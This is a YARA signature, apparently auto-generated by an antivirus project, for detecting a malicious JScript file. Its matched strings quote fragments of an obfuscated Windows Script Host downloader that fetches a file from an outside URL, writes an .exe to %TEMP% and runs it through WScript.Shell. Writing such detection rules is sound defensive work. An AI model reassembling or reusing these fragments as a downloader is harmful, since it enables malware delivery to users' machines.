rule sig_20160401_e9136750ed358cad04713d78a7bb96b1 {
  meta:
    description = "datamaliciousorder - file 20160401_e9136750ed358cad04713d78a7bb96b1.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "fe6934679e1bf4b7ae4d37d72dae4225dc9d26d150e47955ea5268d60e0a6e40"

  strings:
    $s1  = "function UumEy(KtgEpk, JfOjv){AgaDg = AgaDg * 1; return KtgEpk - JfOjv;};" fullword ascii
    $s2  = "var BpLdf = function BhfQhg() {return WScript[BrNsg](\"WScript\"+\".Shell\");}(), TvQp = 11;" fullword ascii
    $s3  = "BfcPs[SzPws](\"G\" + \"ET\", \"http://toysnet.nl/f9sla\", false);" fullword ascii
    $s4  = "if (BfcPs[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function GtBh(){return OmzVe + \"\";};" fullword ascii
    $s6  = "function YsxFhi() {return BpLdf[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"NRcjOkH5AUqSe.ex\" + \"e\";};" fullword ascii
    $s7  = "function EcgGuc() {return ((PtQq == true) && (PtQq == VpNy)) ? 1 : AgaDg;};" fullword ascii
    $s8  = "var PtQq = false;" fullword ascii
    $s9  = "var VniOlu = false;" fullword ascii
    $s10 = "var GraUvx = new this[\"Date\"]();" fullword ascii
    $s11 = "function KuaKze(){return 23;};" fullword ascii
    $s12 = "}while (WtpDym);" fullword ascii
    $s13 = "return UumEy(PcmYiu, VvoGj);" fullword ascii
    $s14 = "function TtGf(){return BrNsg;};" fullword ascii
    $s15 = "function LliDic()" fullword ascii
    $s16 = "function OuaWz(HfuLgy){BpLdf[\"R\"+\"un\"](HfuLgy, AgaDg, AgaDg);};" fullword ascii
    $s17 = "VpNy = true; " fullword ascii
    $s18 = "PtQq = true; " fullword ascii
    $s19 = "var VpNy = false;" fullword ascii
    $s20 = "} catch(IbqHie){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}